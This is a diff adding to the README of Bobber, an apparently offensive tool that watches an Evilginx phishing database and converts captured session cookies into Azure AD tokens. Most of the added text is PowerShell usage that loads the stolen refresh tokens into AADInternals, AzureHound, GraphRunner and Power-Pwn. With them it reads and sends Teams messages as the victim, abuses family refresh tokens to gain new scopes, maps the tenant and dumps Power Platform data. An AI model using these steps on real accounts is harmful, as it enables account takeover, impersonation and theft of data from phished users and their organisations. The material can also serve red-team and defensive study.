@@ -93,7 +93,7 @@ RoadTools Options:
 
 # Example Usage
 
-Monitor a local file for changes, exchange cookie for JWT tokens, from get pushover notifications when a new session is found, exfiltrate all data
+Monitor a local file for changes, exchange captured cookie for JWT tokens, get pushover notifications when a new session is found, exfiltrate all data
 ```
 python Bobber.py evilginx_data.db --user-key 98fc5roupp78g0ymvzcw2ygun2gz7u --api-token jg3sycg5lwkqoxa647eaqzdhnrtlwy --all
 ```
@@ -107,3 +107,79 @@ Monitor a remote file for changes via SSH, authenticate using a username and pas
 ```
 python Bobber.py "/root/.evilginx/data.db" --username root --password 'MySuperPass123!' --host 1337.66.69.420  --owa 
 ```
+
+# RoadTools auth file usage with other tools
+
+When Bobber captures an complete Evilginx session, then tokens retrived using RoadTools will be stored in a file with the following naming convnetion `.sanitized_email_roadtools_auth`. This file can be used in combination with many other tools besides TeamFiltration. Here are a few examples, from the context of an PowerShell prompt.
+
+### AADInternals
+[AADInternals](https://aadinternals.com/aadinternals/#introduction) is an Modular powershell-framework for exploring the pathways your access might have, created by my favorite finnish person [@DrAzureAD](https://twitter.com/DrAzureAD)
+
+```
+#read and parse RoadTools auth file into an JSON object
+$roadToolsAuth = Get-Content .\firstname_lastname_example_com_roadtools_auth -raw | ConvertFrom-Json
+
+#Add the token information from RoadTools to cache so it will be used for auth
+Add-AADIntAccessTokenToCache -AccessToken $roadToolsAuth.accessToken -RefreshToken $roadToolsAuth.refreshToken
+
+#Read Teams messages from the GraphAPI
+Get-AADIntTeamsMessages | Format-Table id,content,deletiontime,*type*,DisplayName
+
+# Send a Teams message to an an user, using the GraphAPI
+Send-AADIntTeamsMessage -Recipients "bruce.wayne@example.com" -Message "Hello there, BATMAN!"
+
+#Abuse [Family Refresh Tokens](https://github.com/secureworks/family-of-client-ids-research#abusing-family-refresh-tokens-for-unauthorized-access-and-persistence-in-azure-active-directory) to refresh as the the "Microsoft Azure PowerShell" Application (1950a258-227b-4e31-a9cf-717495945fc2). Obtains an access-token with different scope.
+$msAzJWT =Get-AADIntAccessTokenWithRefreshToken -ClientId "1950a258-227b-4e31-a9cf-717495945fc2" -Resource "https://graph.microsoft.com" -TenantId $roadToolsAuth.tenantId -RefreshToken $roadToolsAuth.refreshToken -SaveToCache 1 -IncludeRefreshToken 1
+```
+
+### AzureHound
+[AzureHound](https://github.com/BloodHoundAD/AzureHound) is an BloodHound data collector for Microsoft Azure, from the great people over at [@SpecterOps](https://twitter.com/SpecterOps)
+
+```
+#read and parse RoadTools auth file into an JSON object
+$roadToolsAuth = Get-Content .\firstname_lastname_example_com_roadtools_auth -raw | ConvertFrom-Json
+
+#Use the refresh token and tenantId in order to run AzureHound against the tenant
+azurehound.exe -r $roadToolsAuth.refreshToken -t $roadToolsAuth.tenantId list -o output.json
+```
+
+### GraphRunner
+[GraphRunner](https://github.com/dafthack/GraphRunner) Powershell based post-exploitation toolset for interacting with the Microsoft Graph API, by [@dafthack](https://twitter.com/dafthack)
+```
+#Import GraphRunner
+Import-Module .\GraphRunner.ps1
+
+#read and parse RoadTools auth file into an JSON object
+#While the JSON object of roadtools does not match what GraphRunner needs,enought objects match in order to "trick" GraphRunner into allowing us to run RefreshGraphTokens
+$tokens = Get-Content .\firstname_lastname_example_com_roadtools_auth -raw | ConvertFrom-Json
+
+#Run RefreshGraphTokens in order to update our $tokens var 
+Invoke-RefreshGraphTokens -RefreshToken $roadToolsAuth.refreshToken  -tenantid $roadToolsAuth.tenantId
+
+#Most common command to dump a series of information from the GraphAPI
+Invoke-GraphRunner -Tokens $tokens
+```
+
+
+### Power-Pwn
+[Power-Pwn](https://github.com/mbrg/power-pwn) in Python based offensive security toolset for targeting the Microsoft 365 Power Platform, by [@mbrg0](https://twitter.com/mbrg0)
+```
+#read and parse RoadTools auth file into an JSON object
+$roadToolsAuth = Get-Content .\firstname_lastname_example_com_roadtools_auth -raw | ConvertFrom-Json
+
+#Create tokens.json in the same directory you are running powerpwn.exe from
+@{cli_refresh_token = $roadToolsAuth.refreshToken } | ConvertTo-Json | Set-Content -Path 'tokens.json'
+
+#Perform recon of possible Power Platform deployments
+powerpwn.exe recon -t $roadToolsAuth.tenantId
+
+#Dump data from found Power Platform deployments
+powerpwn.exe dump -t $roadToolsAuth.tenantId
+```
+
+
+# Todo
+
+- [ ] Allow for capture and notification for other username + password + cookie combinations
+- [ ] 
+- [ ] 
